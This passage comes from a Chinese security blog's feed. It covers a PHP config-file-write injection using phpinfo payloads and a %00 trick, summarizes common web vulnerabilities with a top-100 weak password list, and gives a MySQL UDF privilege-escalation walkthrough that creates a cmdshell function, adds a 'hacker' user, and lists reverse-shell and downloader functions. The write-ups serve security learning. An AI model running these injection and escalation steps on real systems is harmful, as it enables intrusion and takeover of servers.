&apos;&lt;?php\n$option=\&apos;bbb\&apos;;phpinfo();\n//\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:5</div><div class="line">                       &gt;=&gt; &apos;&lt;?php\n$option=\&apos;bbb\&apos;;phpinfo();\n//\&apos;;\n\n&apos;</div><div class="line">                       =&gt; $file = &apos;&lt;?php\n$option=\&apos;bbb\&apos;;phpinfo();\n//\&apos;;\n\n&apos; D:\phpstudy\www\index.php:5</div><div class="line">0.0024     334400     -&gt; file_put_contents(&apos;./config.php&apos;, &apos;&lt;?php\n$option=\&apos;bbb\&apos;;phpinfo();\n//\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:6</div><div class="line">                       &gt;=&gt; 37</div><div class="line">                     &gt;=&gt; 1</div><div class="line">0.0067 zu</div></pre></td></tr></table></figure></p>
+<p>此时config.php内容变为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$option=&apos;bbb&apos;;phpinfo();</div><div class="line">//&apos;;</div></pre></td></tr></table></figure></p>
+<h3 id="0x03-利用-00"><a href="#0x03-利用-00" class="headerlink" title="0x03 利用%00"></a>0x03 利用%00</h3><p>仍然分为两步：<br><strong>1、第一次传入;phpinfo();</strong>，即：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/index.php?option=;phpinfo();</div></pre></td></tr></table></figure></p>
+<p>调试如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">0.0005     333880   -&gt; &#123;main&#125;() D:\phpstudy\www\index.php:0</div><div class="line">  0.0007     333912     -&gt; addslashes(&apos;;phpinfo();&apos;) D:\phpstudy\www\index.php:3</div><div class="line">                         &gt;=&gt; &apos;;phpinfo();&apos;</div><div class="line">                         =&gt; $str = &apos;;phpinfo();&apos; D:\phpstudy\www\index.php:3</div><div class="line">  0.0009     334080     -&gt; file_get_contents(&apos;./config.php&apos;) D:\phpstudy\www\index.php:4</div><div class="line">                         &gt;=&gt; &apos;&lt;?php\n$option=\&apos;;phpinfo();\&apos;;\n\n&apos;</div><div class="line">                         =&gt; $file = &apos;&lt;?php\n$option=\&apos;;phpinfo();\&apos;;\n\n&apos; D:\phpstudy\www\index.php:4</div><div class="line">  0.0012     334488     -&gt; preg_replace(&apos;|\\$option=\&apos;.*\&apos;;|&apos;, &apos;$option=\&apos;;phpinfo();\&apos;;&apos;, &apos;&lt;?php\n$option=\&apos;;phpinfo();\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:5</div><div class="line">                         &gt;=&gt; &apos;&lt;?php\n$option=\&apos;;phpinfo();\&apos;;\n\n&apos;</div><div class="line">                         =&gt; $file = &apos;&lt;?php\n$option=\&apos;;phpinfo();\&apos;;\n\n&apos; D:\phpstudy\www\index.php:5</div><div class="line">  0.0014     334448     -&gt; file_put_contents(&apos;./config.php&apos;, &apos;&lt;?php\n$option=\&apos;;phpinfo();\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:6</div><div class="line">                         &gt;=&gt; 30</div><div class="line">                       &gt;=&gt; 1</div><div class="line">  0.0057 zu</div></pre></td></tr></table></figure></p>
+<p>config.php的内容变化：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$option=&apos;;phpinfo();&apos;;</div></pre></td></tr></table></figure></p>
+<p><strong>2、第二次传入%00</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1/index.php?option=%00</div></pre></td></tr></table></figure></p>
+<p>%00被addslashes()转为\0，而\0在preg_replace函数中会被替换为“匹配到的全部内容”<br>此时preg_replace要执行的代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">preg_replace(&apos;|\$option=\&apos;.*\&apos;;|&apos;,&quot;\$option=&apos;\\0&apos;;&quot;,$file);</div></pre></td></tr></table></figure></p>
+<p>或<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">preg_replace(&apos;|\$option=\&apos;.*\&apos;;|&apos;,&quot;\$option=&apos;$0&apos;;&quot;,$file);</div></pre></td></tr></table></figure></p>
+<p>即执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">preg_replace(&apos;|\$option=\&apos;.*\&apos;;|&apos;,&quot;\$option=&apos;$option=&apos;;phpinfo();&apos;;&apos;;&quot;,$file);</div></pre></td></tr></table></figure></p>
+<p>调试过程：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">0.0004     333832   -&gt; &#123;main&#125;() D:\phpstudy\www\index.php:0</div><div class="line">  0.0006     333864     -&gt; addslashes(&apos;\000&apos;) D:\phpstudy\www\index.php:3</div><div class="line">                         &gt;=&gt; &apos;\\0&apos;</div><div class="line">                         =&gt; $str = &apos;\\0&apos; D:\phpstudy\www\index.php:3</div><div class="line">  0.0007     334016     -&gt; file_get_contents(&apos;./config.php&apos;) D:\phpstudy\www\index.php:4</div><div class="line">                         &gt;=&gt; &apos;&lt;?php\n$option=\&apos;$option=\&apos;;phpinfo();\&apos;;\&apos;;\n\n&apos;</div><div class="line">                         =&gt; $file = &apos;&lt;?php\n$option=\&apos;$option=\&apos;;phpinfo();\&apos;;\&apos;;\n\n&apos; D:\phpstudy\www\index.php:4</div><div class="line">  0.0011     334432     -&gt; preg_replace(&apos;|\\$option=\&apos;.*\&apos;;|&apos;, &apos;$option=\&apos;\\0\&apos;;&apos;, &apos;&lt;?php\n$option=\&apos;$option=\&apos;;phpinfo();\&apos;;\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:5</div><div class="line">                         &gt;=&gt; &apos;&lt;?php\n$option=\&apos;$option=\&apos;$option=\&apos;;phpinfo();\&apos;;\&apos;;\&apos;;\n\n&apos;</div><div class="line">                         =&gt; $file = &apos;&lt;?php\n$option=\&apos;$option=\&apos;$option=\&apos;;phpinfo();\&apos;;\&apos;;\&apos;;\n\n&apos; D:\phpstudy\www\index.php:5</div><div class="line">  0.0013     334408     -&gt; file_put_contents(&apos;./config.php&apos;, &apos;&lt;?php\n$option=\&apos;$option=\&apos;$option=\&apos;;phpinfo();\&apos;;\&apos;;\&apos;;\n\n&apos;) D:\phpstudy\www\index.php:6</div><div class="line">                         &gt;=&gt; 52</div><div class="line">                       &gt;=&gt; 1</div><div class="line">  0.0071 zu</div></pre></td></tr></table></figure></p>
+<p>config.php的变化：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line">$option=&apos;\$option=&apos;;phpinfo();&apos;;&apos;;</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;p师傅前几天的小密圈的一个问题，这是一个经典的配置文件写入问题漏洞:&lt;/p&gt;
+&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&amp;lt;?php&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;if(!isset($_GET[&amp;apos;option&amp;apos;])) die();&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$str = addslashes($_GET[&amp;apos;option&amp;apos;]);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$file = file_get_contents(&amp;apos;./config.php&amp;apos;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;$file = preg_replace(&amp;apos;|\$option=\&amp;apos;.*\&amp;apos;;|&amp;apos;, &amp;quot;\$option=&amp;apos;$str&amp;apos;;&amp;quot;, $file);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;file_put_contents(&amp;apos;./config.php&amp;apos;, $file);&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;config.php的内容：
+    
+    </summary>
+    
+    
+      <category term="php" scheme="http://yoursite.com/tags/php/"/>
+    
+      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>常见漏洞总结</title>
+    <link href="http://yoursite.com/2017/03/14/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"/>
+    <id>http://yoursite.com/2017/03/14/常见漏洞总结/</id>
+    <published>2017-03-14T12:00:08.000Z</published>
+    <updated>2017-03-14T12:09:32.910Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-安全配置错误"><a href="#0x01-安全配置错误" class="headerlink" title="0x01 安全配置错误"></a>0x01 安全配置错误</h3><h4 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h4><p>   好的安全需要对应用程序、框架、应用程序服务器、web服务器、数据库服务器和平台定义和执行安全配置。由于许多配置的默认值并不是安全的，因此，必须定义、实施和维护这些配置。这包含了对所有的软件保持及时的更新，包括所有应用程序的库文件。<br>   安全配置错误可以发生在一个应用程序堆栈的任何层面，包括平台、Web服务器、应用服务器、数据库、架构和自定义代码。攻击者通过访问默认账户、未使用的网页、未安装补丁的漏洞、未被保护的文件和目录等，以获得对系统未授权的访问。<a id="more"></a></p>
+<h4 id="0x02-形成原因"><a href="#0x02-形成原因" class="headerlink" title="0x02 形成原因"></a>0x02 形成原因</h4><p>1、软件没有被及时更新，包括操作系统、web应用服务器、数据库管理系统、应用程序和其他所有的代码库文件<br>2、apache服务器配置为显示目录索引，能够查看目录结构；没有关闭错误显示，可以根据错误提示获取敏感信息；没有删除默认的文件如phpinfo文件等<br>3、nginx服务器使用了autoindex模块、开启服务器标记、没有对IP连接数做限制、文件类型错误解析等等<br>4、开发框架（例如Struts、Spring等）和库文件中的安全设置没有配置恰当</p>
+<h4 id="0x03-危害性"><a href="#0x03-危害性" class="headerlink" title="0x03 危害性"></a>0x03 危害性</h4><p>不当的安全配置，攻击者能访问一些未授权的系统数据或功能，会使系统处于高风险中，随时都有可能被攻破，造成不可估量的损失。</p>
+<h4 id="0x04-防御方法"><a href="#0x04-防御方法" class="headerlink" title="0x04 防御方法"></a>0x04 防御方法</h4><p>1、自动化安装部署，保证开发、QA、产品环境的配置尽量相同，减少部署一个新安全环境的耗费。<br>2、及时了解并部署每个环境的软件更新和补丁信息，确保所有应用都何如了最新的安全补丁，包括第三方软件或平台，特别是开源软件，需要及时升级和更新安全补丁。<br>3、提供有效分离和安全性强大的应用程序架构。<br>4、实施漏洞扫描和安全审计，以帮助检查错误的配置或者未安装的补丁，推荐使用nessus，AppScan等扫描软件对应用程序和服务器进行安全扫描。<br>5、使用最小权限原则，给用户分配刚好能够满足业务范畴的权限。<br>6、禁止将.old, .bak, .test等测试文件或备份文件随产品发布，禁止将文件上传到Web服务器目录，禁止给上传的文件可执行权限。<br>7、对使用的Web容器，操作系统进行加固，不要使用管理员账户运行应用程序和数据库服务，如禁用Web容器的控制台，不要使用数据库管理严账户运行数据库，配置SSL通道，采用安全的TSL协议版本，配置安全加密套件，合理控制文件权限。<br>8、合理处理应用程序错误，不要将敏感信息随意泄露和展现到客户端，被攻击者利用从而轻易攻破系统。</p>
+<h3 id="0x02-业务逻辑"><a href="#0x02-业务逻辑" class="headerlink" title="0x02 业务逻辑"></a>0x02 业务逻辑</h3><h4 id="0x01-漏洞描述-1"><a href="#0x01-漏洞描述-1" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h4><p>业务逻辑问题是一种设计缺陷。逻辑缺陷表现为设计者或开发者在思考过程中做出的特殊假设存在明显或隐含的错误。<br>精明的攻击者会特别注意目标应用程序采用的逻辑方式，设法了解设计者与开发者做出的可能假设，然后考虑如何攻破这些假设。<br>黑客挖掘逻辑漏洞有两个重点，就是业务流程和HTTP/HTTPS请求篡改。</p>
+<h4 id="0x02-逻辑错误分类"><a href="#0x02-逻辑错误分类" class="headerlink" title="0x02 逻辑错误分类"></a>0x02 逻辑错误分类</h4><p>1.欺骗密码找回功能<br>程序根据一个验证码来确定是用户本人，但是攻击者可以暴力破解验证码。<br>2.规避交易限制<br>攻击者篡改数据报，使得购买的商品为负数，或者商品价格为负数。<br>3.越权缺陷<br>攻击者更改数据包中指示用户的id，来访问他人敏感信息或者冒充他人发布信息。<br>4.cookies和session的问题<br>攻击者在知道用户ID的前提下，然后构造一个cookies或让session值为true就可以绕过这样的认证。<br>5.顺序执行缺陷（强制浏览）<br>攻击者在网购的过程中绕过支付过程，直接从放入购物车步骤进入填写收货地址的步骤，这样的话就可以0元购物了。</p>
+<h4 id="0x03-利用方法"><a href="#0x03-利用方法" class="headerlink" title="0x03 利用方法"></a>0x03 利用方法</h4><p>1、业务逻辑数据验证测试 (OTG-BUSLOGIC-001)<br>在业务逻辑数据验证测试中，我们验证应用程序不允许用户向系统/应用程序插入“未验证”的数据。这是非常重要的，因为如果没有这层防护措施，攻击者可能向应用程序/系统插入“未验证”的数据/信息，而且使系统认为这些数据是“好的”并且已经在“入口”点进行验证，并且让系统相信“入口”点已经实施过了数据验证，因为这是业务逻辑工作流的一环。<br>2、请求伪造能力测试 (OTG-BUSLOGIC-002)<br>在伪造和参数预测测试中，我们验证应用程序不允许用户向系统任何不应该有权限访问的或者需要特定时间特定方法访问的组件中提交或改变数据。这非常重要，因为缺少这层防护措施，攻击者可能通过“愚弄/忽悠”应用系统允许他们进入本不能进入的区域，绕过了应用业务逻辑工作流。<br>3、完整性测试 (OTG-BUSLOGIC-003)<br>在完整性检查和篡改证据测试中，我们验证应用程序不允许用户破坏系统任何部分或数据的完整性。这非常重要，因为缺少这层防护措施，攻击者能打破业务逻辑工作流，并改变已经被攻破的应用/系统数据或者通过改变日志文件中的信息掩盖某种行为。<br>4、过程时长测试 (OTG-BUSLOGIC-004)<br>在过程时长测试中，我们验证应用程序不允许用户通过输入/输出时长来操作系统或者预测系统行为。这非常重要，因为缺少这层防护，攻击者可能能监视处理时间和确定基于时间的输出内容或通过时间差异不完成某事务或某动作来绕过应用程序业务逻辑。<br>5、功能使用次数限制测试 (OTG-BUSLOGIC-005)<br>在功能限制测试中，我们验证应用程序不允许用户使用超出应用程序的份额或业务工作流需要的功能次数。这非常重要，因为缺少这层防护，攻击者可能能超出业务使用次数许可地使用应用程序功能或者份额来获取额外的利益。<br>6、工作流程绕过测试 (OTG-BUSLOGIC-006)<br>在绕过工作流的测试中，我们验证应用系统不允许用户实施在业务处理流程“支持/需要”之外的动作。这非常重要，因为缺少这层防护，攻击者可能能绕过工作流和某些检查，允许他们提前进入或跳过某些必须的区域。应用系统潜在允许动作/事务在不完成完整的业务流程下完成，使整个系统处在不完整的信息追踪回溯的环境中。<br>7、应用误用防护测试 (OTG-BUSLOGIC-007)<br>在应用程序误用测试中，我们验证系统不允许用户以不预期的方式使用应用程序。<br>8、非预期文件类型上传测试 (OTG-BUSLOGIC-008)<br>在非预期文件上传测试中，我们验证应用程序不允许用户上传系统期待或业务逻辑允许以外的文件类型的文件。这非常重要因为缺少这层防护，攻击者可能提交非预期的文件如.exe或.php，这些文件可能被保存在系统之中，并被系统或应用程序执行。<br>9、恶意文件上传测试 (OTG-BUSLOGIC-009)<br>在恶意文件上传测试中，我们验证应用系统不允许用户向系统上传能破坏系统安全的恶意或潜在恶意文件。这非常重要因为缺少这层防护措施，攻击者就能够向系统上传恶意文件来传播病毒、恶意软件甚至利用程序如执行shellcode。</p>
+<h3 id="0x03-弱口令"><a href="#0x03-弱口令" class="headerlink" title="0x03 弱口令"></a>0x03 弱口令</h3><h4 id="0x01-漏洞描述-2"><a href="#0x01-漏洞描述-2" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h4><p>   通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。<br>    常见弱口令有：<br>    1、数字或字母连排或混排，键盘字母连排（如：123456，abcdef，123abc，qwerty，1qaz2wsx等）；<br>    2、生日，姓名+生日（利用社工非常容易被破解）；<br>    3、短语密码（如：5201314，woaini1314等）。</p>
+<h4 id="0x02-形成原因-1"><a href="#0x02-形成原因-1" class="headerlink" title="0x02 形成原因"></a>0x02 形成原因</h4><p>   这个应该是与个人习惯相关与意识相关，为了避免忘记密码，使用一个非常容易记住的密码，或者是直接采用系统的默认密码等。<br>相关的安全意识不够，总认为不会有人会猜到我这个弱口令的。</p>
+<h4 id="0x03-危害性-1"><a href="#0x03-危害性-1" class="headerlink" title="0x03 危害性"></a>0x03 危害性</h4><p>   在当今很多地方以用户名(帐号)和口令作为鉴权的世界，口令的重要性就可想而知了。口令就相当于进入家门的钥匙，当他人有一把可以进入你家的钥匙，想想你的安全、你的财物、你的隐私。因为弱口令很容易被他人猜到或破解，所以如果你使用弱口令，就像把家门钥匙放在家门口的垫子下面，是非常危险的。</p>
+<h4 id="0x04-防御方法-1"><a href="#0x04-防御方法-1" class="headerlink" title="0x04 防御方法"></a>0x04 防御方法</h4><p>设置密码通常遵循以下原则：<br>（1）不使用空口令或系统缺省的口令，这些口令众所周之，为典型的弱口令。<br>（2）口令长度不小于8 个字符。<br>（3）口令不应该为连续的某个字符（例如：AAAAAAAA）或重复某些字符的组合（例如：tzf.tzf.）。<br>（4）口令应该为以下四类字符的组合，大写字母(A-Z)、小写字母(a-z)、数字(0-9)和特殊字符。每类字符至少包含一个。如果某类字符只包含一个，那么该字符不应为首字符或尾字符。<br>（5）口令中不应包含本人、父母、子女和配偶的姓名和出生日期、纪念日期、登录名、E-mail 地址等等与本人有关的信息，以及字典中的单词。<br>（6）口令不应该为用数字或符号代替某些字母的单词。<br>（7）口令应该易记且可以快速输入，防止他人从你身后很容易看到你的输入。<br>（8）至少90 天内更换一次口令，防止未被发现的入侵者继续使用该口令。</p>
+<p><strong>附：弱口令top100</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div></pre></td><td class="code"><pre><div class="line">123456789</div><div class="line">a123456</div><div class="line">123456</div><div class="line">a123456789</div><div class="line">1234567890</div><div class="line">woaini1314</div><div class="line">qq123456</div><div class="line">abc123456</div><div class="line">123456a</div><div class="line">123456789a</div><div class="line">147258369</div><div class="line">zxcvbnm</div><div class="line">987654321</div><div class="line">12345678910</div><div class="line">abc123</div><div class="line">qq123456789</div><div class="line">123456789.</div><div class="line">7708801314520</div><div class="line">woaini</div><div class="line">5201314520</div><div class="line">q123456</div><div class="line">123456abc</div><div class="line">1233211234567</div><div class="line">123123123</div><div class="line">123456.</div><div class="line">0123456789</div><div class="line">asd123456</div><div class="line">aa123456</div><div class="line">135792468</div><div class="line">q123456789</div><div class="line">abcd123456</div><div class="line">12345678900</div><div class="line">woaini520</div><div class="line">woaini123</div><div class="line">zxcvbnm123</div><div class="line">1111111111111111</div><div class="line">w123456</div><div class="line">aini1314</div><div class="line">abc123456789</div><div class="line">111111</div><div class="line">woaini521</div><div class="line">qwertyuiop</div><div class="line">1314520520</div><div class="line">1234567891</div><div class="line">qwe123456</div><div class="line">asd123</div><div class="line">000000</div><div class="line">1472583690</div><div class="line">1357924680</div><div class="line">789456123</div><div class="line">123456789abc</div><div class="line">z123456</div><div class="line">1234567899</div><div class="line">aaa123456</div><div class="line">abcd1234</div><div class="line">www123456</div><div class="line">123456789q</div><div class="line">123abc</div><div class="line">qwe123</div><div class="line">w123456789</div><div class="line">7894561230</div><div class="line">123456qq</div><div class="line">zxc123456</div><div class="line">123456789qq</div><div class="line">1111111111</div><div class="line">111111111</div><div class="line">0000000000000000</div><div class="line">1234567891234567</div><div class="line">qazwsxedc</div><div class="line">qwerty</div><div class="line">123456..</div><div class="line">zxc123</div><div class="line">asdfghjkl</div><div class="line">0000000000</div><div class="line">1234554321</div><div class="line">123456q</div><div class="line">123456aa</div><div class="line">9876543210</div><div class="line">110120119</div><div class="line">qaz123456</div><div class="line">qq5201314</div><div class="line">123698745</div><div class="line">5201314</div><div class="line">000000000</div><div class="line">as123456</div><div class="line">123123</div><div class="line">5841314520</div><div class="line">z123456789</div><div class="line">52013145201314</div><div class="line">a123123</div><div class="line">caonima</div><div class="line">a5201314</div><div class="line">wang123456</div><div class="line">abcd123</div><div class="line">123456789..</div><div class="line">woaini1314520</div><div class="line">123456asd</div><div class="line">aa123456789</div><div class="line">741852963</div><div class="line">a12345678</div></pre></td></tr></table></figure></p>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;0x01-安全配置错误&quot;&gt;&lt;a href=&quot;#0x01-安全配置错误&quot; class=&quot;headerlink&quot; title=&quot;0x01 安全配置错误&quot;&gt;&lt;/a&gt;0x01 安全配置错误&lt;/h3&gt;&lt;h4 id=&quot;0x01-漏洞描述&quot;&gt;&lt;a href=&quot;#0x01-漏洞描述&quot; class=&quot;headerlink&quot; title=&quot;0x01 漏洞描述&quot;&gt;&lt;/a&gt;0x01 漏洞描述&lt;/h4&gt;&lt;p&gt;   好的安全需要对应用程序、框架、应用程序服务器、web服务器、数据库服务器和平台定义和执行安全配置。由于许多配置的默认值并不是安全的，因此，必须定义、实施和维护这些配置。这包含了对所有的软件保持及时的更新，包括所有应用程序的库文件。&lt;br&gt;   安全配置错误可以发生在一个应用程序堆栈的任何层面，包括平台、Web服务器、应用服务器、数据库、架构和自定义代码。攻击者通过访问默认账户、未使用的网页、未安装补丁的漏洞、未被保护的文件和目录等，以获得对系统未授权的访问。
+    
+    </summary>
+    
+    
+      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>提权思路</title>
+    <link href="http://yoursite.com/2017/03/07/%E6%8F%90%E6%9D%83%E6%80%9D%E8%B7%AF/"/>
+    <id>http://yoursite.com/2017/03/07/提权思路/</id>
+    <published>2017-03-07T14:52:04.000Z</published>
+    <updated>2017-03-07T14:55:29.597Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="0x01-mysql提权"><a href="#0x01-mysql提权" class="headerlink" title="0x01 mysql提权"></a>0x01 mysql提权</h3><h4 id="0x01-UDF提权"><a href="#0x01-UDF提权" class="headerlink" title="0x01 UDF提权"></a>0x01 UDF提权</h4><p>1、利用UDF提权<br>udf提权这是最常见的提权方式，也就是User defined Function,用户定义函数。是一类对MYSQL服务器功能进行扩充的代码，通常是用C（或C++）写的。通过添加新函数，性质就象使用本地MYSQL函数abs()或concat()。当你需要扩展MYSQL服务器功能时，UDF通常是最好的选择。但同时，UDF也是黑客们在拥有低权限mysql账号时比较好用的一种提权方法。<a id="more"></a></p>
+<p><strong>适用场合：</strong><br>1、目标主机系统是Windows（Win2000、XP、Win2003）。<br>2、拥有该主机mysql中的某个用户账号，该账号需要有对mysql的insert和delete权限。</p>
+<p><strong>使用方法：</strong><br>1、获取当前mysql的一个账号，一般情况下在网站的config.php文件就能找到（具体在哪个文件每个CMS都不一样）。<br>2、把udf专用的webshell传到服务器上，访问并进行数据库连接。<br>3、连接成功后，导出DLL文件。mysql<5.0，导出路径随意；5.0<=mysql<5.1，则需要导出至目标服务器的系统目录（如：system32），否则在下一步操作中你会看到“no paths="" allowed="" for="" shared="" library”错误；mysql="">5.1，需要使用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">show variables like &apos;%plugin%&apos;;</div></pre></td></tr></table></figure></5.0，导出路径随意；5.0<=mysql<5.1，则需要导出至目标服务器的系统目录（如：system32），否则在下一步操作中你会看到“no></p>
+<p>语句查看插件安装路径，导出的时候指定DLL路径为插件路径。<br>回显如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">mysql&gt; show variables like &apos;%plugin%&apos;;</div><div class="line">+---------------+------------------------------------------+</div><div class="line">| Variable_name | Value                                    |</div><div class="line">+---------------+------------------------------------------+</div><div class="line">| plugin_dir    | E:\wamp\bin\mysql\mysql5.5.20\lib/plugin |</div><div class="line">+---------------+------------------------------------------+</div></pre></td></tr></table></figure></p>
+<p>4、使用SQL语句创建自定义函数。语法如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Create Function 函数名 returns string soname &apos;导出的DLL路径&apos;;</div><div class="line">// eg:Create Function cmdshell returns string soname &apos;udf.dll&apos;;</div></pre></td></tr></table></figure></p>
+<p>常用函数名：</p>
+<pre><code>cmdshell    执行cmd;
+downloader  下载者,到网上下载指定文件并保存到指定目录;
+open3389    通用开3389终端服务,可指定端口(不改端口无需重启);
+backshell   反弹Shell;
+ProcessView 枚举系统进程;
+KillProcess 终止指定进程;
+regread     读注册表;
+regwrite    写注册表;
+shut        关机,注销,重启;
+about       说明与帮助函数;
+</code></pre><p>若mysql&gt;=5.0，语句中的DLL不允许带全路径，如果在第二步中已将DLL导出到系统目录，那么你就可以省略路径而使命令正常执行，否则将会看到”Can’t open shared library“错误。<br>如果提示“Function ‘cmdshell’ already exists”，则输入下列语句可以解决：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">delete from mysql.func where name=&apos;cmdshell&apos;</div></pre></td></tr></table></figure></p>
+<p>5、创建函数成功后，就可以通过sql语句去调用它了。语法如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select 创建的函数名 (&apos;参数列表&apos;);</div><div class="line">// eg:select cmdshell(&quot;net user hacker 12345 /add&quot;); 创建一个用户hacker，密码为12345</div></pre></td></tr></table></figure></p>
+<p> 6、函数使用完后，我们需要把之前生成的DLL和创建的函数删除掉，但要注意次序，必须先删除函数再删除DLL。删除函数的语法如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">drop function 创建的函数名;</div><div class="line">// eg:drop function cmdshell;</div></pre></td></tr></table></figure></p>
